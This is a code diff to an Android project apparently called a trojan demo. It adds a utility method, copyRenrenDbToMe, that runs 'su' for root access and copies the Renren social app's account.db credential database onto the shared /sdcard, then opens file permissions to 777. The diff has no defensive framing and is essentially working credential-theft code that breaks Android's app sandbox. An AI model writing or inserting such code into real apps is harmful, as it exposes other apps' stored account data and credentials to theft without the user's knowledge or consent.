@@ -2,9 +2,13 @@ package com.singuloid.trojandemo.utils;
 
 import android.app.ProgressDialog;
 import android.content.Context;
+import android.database.sqlite.SQLiteDatabase;
+import android.util.Log;
 import android.widget.Toast;
 
+import java.io.DataOutputStream;
 import java.io.File;
+import java.io.IOException;
 
 /**
  * Created by administrator on 14-9-12.
@@ -50,5 +54,25 @@ public class Utils {
 
         }
         return res;
+    }
+
+
+
+    public static void copyRenrenDbToMe() throws IOException {
+        Process process = Runtime.getRuntime().exec("su");
+        DataOutputStream out = new DataOutputStream(process.getOutputStream());
+//        out.writeBytes("mkdir -p /data/data/com.singuloid.trojandemo/databases\n");
+        out.writeBytes("mkdir -p /sdcard/mydatabases\n");
+//        out.writeBytes("cat /data/data/com.renren.mobile.android/databases/account.db > /data/data/com.singuloid.trojandemo/databases/account.db\n");
+        out.writeBytes("cat /data/data/com.renren.mobile.android/databases/account.db > /sdcard/account.db\n");
+        out.writeBytes("chmod 777 /data/data/com.singuloid.trojandemo/databases/account.db\n");
+//        out.writeBytes("chown system:sdcard_r /sdcard/account.db\n");
+        out.writeBytes("exit\n");
+        out.flush();
+        try {
+            process.waitFor();
+        } catch (InterruptedException e) {
+            e.printStackTrace();
+        }
     }
 }
